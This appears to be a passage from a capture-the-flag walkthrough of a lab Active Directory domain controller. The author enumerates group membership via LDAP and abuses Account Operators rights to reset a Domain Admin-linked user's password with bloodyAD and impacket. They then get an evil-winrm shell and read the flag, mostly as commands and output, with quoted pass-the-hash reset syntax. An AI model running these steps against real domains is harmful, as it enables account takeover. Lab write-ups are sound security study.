dscorepropagationdata: 2024-08-01 05:47:50+00:00, 1601-01-01 00:00:00+00:00
lastlogontimestamp:    2024-09-07 19:28:26.653631+00:00
mail:                  xkate578@soupedecode.local
```

`pywerview get-netgroupmember -w 'SOUPEDECODE.LOCAL' -u 'xkate578' -p 'jesuschrist' --dc-ip 192.168.56.126 --groupname 'Domain Admins'`:
```
groupdomain:  SOUPEDECODE.LOCAL
groupname:    Domain Admins ←
membername:   Operators ←
memberdomain: SOUPEDECODE.LOCAL
isgroup:      True ←
memberdn:     CN=Operators,CN=Users,DC=SOUPEDECODE,DC=LOCAL
objectsid:    S-1-5-21-2986980474-46765180-2505414164-2165 

groupdomain:  SOUPEDECODE.LOCAL
groupname:    Domain Admins ←
membername:   Administrator ←
memberdomain: SOUPEDECODE.LOCAL
isgroup:      False
memberdn:     CN=Administrator,CN=Users,DC=SOUPEDECODE,DC=LOCAL
objectsid:    S-1-5-21-2986980474-46765180-2505414164-500 
```

`pywerview get-netgroupmember -w 'SOUPEDECODE.LOCAL' -u 'xkate578' -p 'jesuschrist' --dc-ip 192.168.56.126 --groupname 'Operators'`:
```
groupdomain:  SOUPEDECODE.LOCAL
groupname:    Operators ←
membername:   fbeth103 ←
memberdomain: SOUPEDECODE.LOCAL
isgroup:      False
memberdn:     CN=Fanny Beth,CN=Users,DC=SOUPEDECODE,DC=LOCAL
objectsid:    S-1-5-21-2986980474-46765180-2505414164-1221 
```

`pywerview get-netuser -w 'SOUPEDECODE.LOCAL' -u 'xkate578' -p 'jesuschrist' --dc-ip 192.168.56.126 --username 'fbeth103'`:
```
objectclass:           top, person, organizationalPerson, user
cn:                    Fanny Beth
sn:                    Beth
l:                     Springfield
st:                    CA
title:                 Analyst
description:           Classic car restorer and automotive enthusiast
postalcode:            21570
telephonenumber:       523-6243
givenname:             Fanny
initials:              FB
distinguishedname:     CN=Fanny Beth,CN=Users,DC=SOUPEDECODE,DC=LOCAL
instancetype:          4
whencreated:           2024-06-15 20:04:41+00:00
whenchanged:           2024-09-05 22:08:09+00:00
displayname:           Fanny Beth
usncreated:            17136
memberof:              CN=Operators,CN=Users,DC=SOUPEDECODE,DC=LOCAL ←
usnchanged:            45078
department:            Dev
company:               CompanyB
streetaddress:         789 Pine St
name:                  Fanny Beth
objectguid:            {4cf14207-fcea-43d1-8693-4041bd208b21}
useraccountcontrol:    NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
badpwdcount:           0
codepage:              0
countrycode:           0
badpasswordtime:       1601-01-01 00:00:00+00:00
lastlogoff:            1601-01-01 00:00:00+00:00
lastlogon:             1601-01-01 00:00:00+00:00
logonhours:            ffffffffffffffffffffffffffffffffffffffffff...
pwdlastset:            2024-08-01 06:09:45.634735+00:00
primarygroupid:        513
objectsid:             S-1-5-21-2986980474-46765180-2505414164-1221
admincount:            1
accountexpires:        1601-01-01 00:00:00+00:00
logoncount:            0
samaccountname:        fbeth103
samaccounttype:        805306368
userprincipalname:     fbeth103@soupedecode.local
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
dscorepropagationdata: 2024-09-05 22:08:09+00:00, 1601-01-01 00:00:00+00:00
mail:                  fbeth103@soupedecode.local
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[389, 636, 3268, 3269 - Pentesting LDAP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)

[**#ldapsearch**]

Check null credentials or if your credentials are valid:
```shell
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v3839
```

If you find something saying that the "_bind must be completed_" means that the credentials are incorrect.

You can extract **everything from a domain** using:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```

Extract **users**:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```

Extract **computers**:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **my info**:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **Domain Admins**:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **Domain Users**:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **Enterprise Admins**:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **Administrators**:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Extract **Remote Desktop Group**:
```shell
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

To see if you have access to any password you can use grep after executing one of the queries:
```shell
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```

Please, notice that the passwords that you can find here could not be the real ones...

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

<🔄 Alternative Step>

`ldapsearch -x -H ldap://192.168.56.126/ -D "xkate578@SOUPEDECODE.LOCAL" -w 'jesuschrist' -b "dc=SOUPEDECODE,dc=LOCAL" "(sAMAccountName=xkate578)" memberOf`:
```
# extended LDIF
#
# LDAPv3
# base <dc=SOUPEDECODE,dc=LOCAL> with scope subtree
# filter: (sAMAccountName=xkate578)
# requesting: memberOf 
#

# Xenia Kate, Users, SOUPEDECODE.LOCAL
dn: CN=Xenia Kate,CN=Users,DC=SOUPEDECODE,DC=LOCAL
memberOf: CN=Account Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL ←

# search reference
ref: ldap://ForestDnsZones.SOUPEDECODE.LOCAL/DC=ForestDnsZones,DC=SOUPEDECODE,
 DC=LOCAL

# search reference
ref: ldap://DomainDnsZones.SOUPEDECODE.LOCAL/DC=DomainDnsZones,DC=SOUPEDECODE,
 DC=LOCAL

# search reference
ref: ldap://SOUPEDECODE.LOCAL/CN=Configuration,DC=SOUPEDECODE,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

`ldapsearch -x -H ldap://192.168.56.126/ -D "xkate578@SOUPEDECODE.LOCAL" -w 'jesuschrist' -b "dc=SOUPEDECODE,dc=LOCAL" "(CN=Domain Admins)" member'`:
```
# extended LDIF
#
# LDAPv3
# base <dc=SOUPEDECODE,dc=LOCAL> with scope subtree
# filter: (CN=Domain Admins)
# requesting: member 
#

# Domain Admins, Users, SOUPEDECODE.LOCAL
dn: CN=Domain Admins,CN=Users,DC=SOUPEDECODE,DC=LOCAL
member: CN=Operators,CN=Users,DC=SOUPEDECODE,DC=LOCAL ←
member: CN=Administrator,CN=Users,DC=SOUPEDECODE,DC=LOCAL ←

# search reference
ref: ldap://ForestDnsZones.SOUPEDECODE.LOCAL/DC=ForestDnsZones,DC=SOUPEDECODE,
 DC=LOCAL

# search reference
ref: ldap://DomainDnsZones.SOUPEDECODE.LOCAL/DC=DomainDnsZones,DC=SOUPEDECODE,
 DC=LOCAL

# search reference
ref: ldap://SOUPEDECODE.LOCAL/CN=Configuration,DC=SOUPEDECODE,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

`ldapsearch -x -H ldap://192.168.56.126/ -D "xkate578@SOUPEDECODE.LOCAL" -w 'jesuschrist' -b "dc=SOUPEDECODE,dc=LOCAL" "(CN=Operators)" member | grep "member:"`:
```
member: CN=Fanny Beth,CN=Users,DC=SOUPEDECODE,DC=LOCAL ←
```

`ldapsearch -x -H ldap://192.168.56.126/ -D "xkate578@SOUPEDECODE.LOCAL" -w 'jesuschrist' -b "dc=SOUPEDECODE,dc=LOCAL" "(CN=Fanny Beth)"`:
```
# extended LDIF
#
# LDAPv3
# base <dc=SOUPEDECODE,dc=LOCAL> with scope subtree
# filter: (CN=Fanny Beth)
# requesting: ALL
#

# Fanny Beth, Users, SOUPEDECODE.LOCAL
dn: CN=Fanny Beth,CN=Users,DC=SOUPEDECODE,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Fanny Beth
sn: Beth
l: Springfield
st: CA
title: Analyst
description: Classic car restorer and automotive enthusiast
postalCode: 21570
telephoneNumber: 523-6243
givenName: Fanny
initials: FB
distinguishedName: CN=Fanny Beth,CN=Users,DC=SOUPEDECODE,DC=LOCAL
instanceType: 4
whenCreated: 20240615200441.0Z
whenChanged: 20240905220809.0Z
displayName: Fanny Beth
uSNCreated: 17136
memberOf: CN=Operators,CN=Users,DC=SOUPEDECODE,DC=LOCAL ←
uSNChanged: 45078
department: Dev
company: CompanyB
streetAddress: 789 Pine St
name: Fanny Beth
objectGUID:: B0LxTOr80UOGk0BBvSCLIQ==
userAccountControl: 66048
badPwdCount: 1
codePage: 0
countryCode: 0
badPasswordTime: 133741183743751784
lastLogoff: 0
lastLogon: 0
logonHours:: ////////////////////////////
pwdLastSet: 133669661856347344
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAerQJsnyUyQIUllWVxQQAAA==
adminCount: 1
accountExpires: 0
logonCount: 0
sAMAccountName: fbeth103 ←
sAMAccountType: 805306368
userPrincipalName: fbeth103@soupedecode.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
dSCorePropagationData: 20240905220809.0Z
dSCorePropagationData: 16010101000000.0Z
mail: fbeth103@soupedecode.local

# search reference
ref: ldap://ForestDnsZones.SOUPEDECODE.LOCAL/DC=ForestDnsZones,DC=SOUPEDECODE,
 DC=LOCAL

# search reference
ref: ldap://DomainDnsZones.SOUPEDECODE.LOCAL/DC=DomainDnsZones,DC=SOUPEDECODE,
 DC=LOCAL

# search reference
ref: ldap://SOUPEDECODE.LOCAL/CN=Configuration,DC=SOUPEDECODE,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

</🔄 Alternative Step>

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[389, 636, 3268, 3269 - Pentesting LDAP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)

[**#Valid Credentials**]

If you have valid credentials to login into the LDAP server, you can dump all the information about the Domain Admin using:

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
```bash
pip3 install ldapdomaindump 
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] -
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`mkdir ./ldapdomaindump`

`ldapdomaindump 192.168.56.126 -u 'SOUPEDECODE.LOCAL\xkate578' -p 'jesuschrist' -o ./ldapdomaindump`:
```
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished ←
```

`ls -alps ./ldapdomaindump`:
```
total 4136
   4 drwxrwxr-x  2 kali kali    4096 Oct 22 18:59 ./
   4 drwx------ 39 kali kali    4096 Oct 22 18:59 ../
  32 -rw-rw-r--  1 kali kali   29016 Oct 22 18:59 domain_computers_by_os.html
  16 -rw-rw-r--  1 kali kali   12399 Oct 22 18:59 domain_computers.grep
  32 -rw-rw-r--  1 kali kali   28694 Oct 22 18:59 domain_computers.html
 208 -rw-rw-r--  1 kali kali  212783 Oct 22 18:59 domain_computers.json
  12 -rw-rw-r--  1 kali kali   10298 Oct 22 18:59 domain_groups.grep
  20 -rw-rw-r--  1 kali kali   17472 Oct 22 18:59 domain_groups.html
  80 -rw-rw-r--  1 kali kali   81076 Oct 22 18:59 domain_groups.json
   4 -rw-rw-r--  1 kali kali     247 Oct 22 18:59 domain_policy.grep
   4 -rw-rw-r--  1 kali kali    1143 Oct 22 18:59 domain_policy.html
   8 -rw-rw-r--  1 kali kali    5255 Oct 22 18:59 domain_policy.json
   4 -rw-rw-r--  1 kali kali      71 Oct 22 18:59 domain_trusts.grep
   4 -rw-rw-r--  1 kali kali     828 Oct 22 18:59 domain_trusts.html
   4 -rw-rw-r--  1 kali kali       2 Oct 22 18:59 domain_trusts.json
 332 -rw-rw-r--  1 kali kali  336309 Oct 22 18:59 domain_users_by_group.html ←
 224 -rw-rw-r--  1 kali kali  226599 Oct 22 18:59 domain_users.grep
 464 -rw-rw-r--  1 kali kali  471141 Oct 22 18:59 domain_users.html
2680 -rw-rw-r--  1 kali kali 2740407 Oct 22 18:59 domain_users.json
```

`firefox ./ldapdomaindump/domain_groups.html`

Account Operators:

| CN        | name      | SAM Name  | Created on       | Changed on        | lastLogon         | Flags                            | pwdLastSet         | SID  | description                             |
|-----------|-----------|-----------|------------------|-------------------|-------------------|----------------------------------|--------------------|------|-----------------------------------------|
| Xenia Kate| Xenia Kate| xkate578  | 06/15/24 20:04:39| 10/23/24 00:34:45 | 09/07/24 20:01:43 | NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD| 08/01/24 05:37:18 | 1182 | Adventure seeker and extreme sports fan |
| ...       | ...       | ...       | ...              | ...               | ...               | ...                               | ...               | ...  | ...                                     |

`firefox ./ldapdomaindump/domain_users_by_group.html`

Domain groups:

| CN               | SAM Name         | Member of groups                                         | description                                    | Created on       | Changed on       | SID  |
|------------------|------------------|----------------------------------------------------------|------------------------------------------------|------------------|------------------|------|
| Account Operators| Account Operators|                                                          | Members can administer domain user and group accounts | 06/15/24 19:25:27| 08/01/24 05:34:35| 548  |
| ...              | ...              | ...                                                      | ...                                            | ...              | ...              | ...  |
| Domain Admins    | Domain Admins    | Denied RODC Password Replication Group, Administrators    | Designated administrators of the domain        | 06/15/24 19:25:27| 08/01/24 06:10:32| 512  |
| ...              | ...              | ...                                                      | ...                                            | ...              | ...              | ...  |
| Operators        | Operators        | Domain Admins                                             |                                                | 08/01/24 06:03:48| 09/05/24 22:08:09| 2166 |
| ...              | ...              | ...                                                      | ...                                            | ...              | ...              | ...  |

<div>
	<img src="./assets/logo_the-hacking-recipes.png" alt="The Hacking Recipes Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>The Hacking Recipes</strong></span>
</div>

[ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)

This abuse can be carried out when controlling an object that has a `GenericAll`, `AllExtendedRights` or `User-Force-Change-Password` over the target user.

It can also be achieved from UNIX-like system with [net](https://linux.die.net/man/8/net), a tool for the administration of samba and cifs/smb clients. The [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) can also be used to run net commands with [pass-the-hash](https://www.thehacker.recipes/ad/movement/ntlm/pth).
```bash
# With net and cleartext credentials (will be prompted)
net rpc password "$TargetUser" -U "$DOMAIN"/"$USER" -S "$DC_HOST"

# With net and cleartext credentials
net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"

# With Pass-the-Hash
pth-net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
```

The [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) can also be used on UNIX-like systems when the package `samba-common-bin` is missing.
```bash
rpcclient -U $DOMAIN/$ControlledUser $DomainController
rpcclient $> setuserinfo2 $TargetUser 23 $NewPassword
```

Alternatively, it can be achieved using [bloodyAD](https://github.com/CravateRouge/bloodyAD)
```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TargetUser" "$NewPassword"
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`bloodyAD --host "192.168.56.126" -d "SOUPEDECODE.LOCAL" -u "xkate578" -p "jesuschrist" set password "fbeth103" 'H4ck3d!'`:
```
[+] Password changed successfully! ←
```

<🔄 Alternative Step>

`impacket-changepasswd 'SOUPEDECODE.LOCAL/fbeth103@192.168.56.126' -altuser 'xkate578' -altpass 'jesuschrist' -newpass 'H4ck3d!' -no-pass -reset`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Setting the password of SOUPEDECODE.LOCAL\fbeth103 as SOUPEDECODE.LOCAL\xkate578 ←
[*] Connecting to DCE/RPC as SOUPEDECODE.LOCAL\xkate578  
[*] Password was changed successfully. ←
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
```

</🔄 Alternative Step>

`crackmapexec smb 192.168.56.126 -d 'SOUPEDECODE.LOCAL' -u 'fbeth103' -p 'H4ck3d!'`:
```
SMB         192.168.56.126  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [+] SOUPEDECODE.LOCAL\fbeth103:H4ck3d! (Pwn3d!) ←
```

`evil-winrm -i 192.168.56.126 -u 'fbeth103' -p 'H4ck3d!'`:
```
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint ←
*Evil-WinRM* PS C:\Users\fbeth103\Documents> 
```

![Victim: fbeth103](https://custom-icon-badges.demolab.com/badge/Victim-fbeth103-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
soupedecode\fbeth103 ←
```

`whoami /groups`:
```
GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                          Attributes
================================================== ================ ============================================ ===============================================================
Everyone                                           Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                      Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                             Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Operators ←                            Group            S-1-5-21-2986980474-46765180-2505414164-2165 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Domain Admins ←                        Group            S-1-5-21-2986980474-46765180-2505414164-512  Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Denied RODC Password Replication Group Alias            S-1-5-21-2986980474-46765180-2505414164-572  Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level               Label            S-1-16-12288
```

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

`hostname`:
```
DC01 ←
```

`cd C:\Users\fbeth103\Desktop`

`dir`:
```
    Directory: C:\Users\fbeth103\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/17/2024  10:41 AM                backup
-a----         6/17/2024  10:44 AM             32 root.txt ←
```

`type root.txt`:
```
b8e59*************************** ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
